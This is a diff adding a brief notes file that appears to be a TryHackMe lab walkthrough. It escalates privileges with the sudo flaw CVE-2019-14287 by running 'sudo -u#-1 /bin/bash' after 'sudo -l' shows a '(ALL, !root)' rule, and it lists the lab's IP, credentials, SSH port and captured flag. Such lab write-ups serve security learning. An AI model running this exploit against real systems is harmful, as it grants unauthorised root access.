@@ -1,0 +1,26 @@
+IP : 10.10.28.201
+
+credentials : tryhackme:tryhackme
+
+SSH Port : 2222
+
+Log in:
+
+run sudo -l
+
+we can run /bin/bash as non root
+	User tryhackme may run the following commands on sudo-privesc:
+	(ALL, !root) NOPASSWD: /bin/bash
+
+Serch for (ALL, !root) NOPASSWD:
+
+found exploit : CVE-2019-14287
+
+run sudo -u#-1 /bin/bash
+
+We are root, get the flag : THM{l33t_s3cur1ty_bypass}
+
+How it works : Well known exploit in sudo, while attemping tu run as user id -1 which is not available it takes
+the next increment value which is 0, and it belongs to root.
+
+!!!
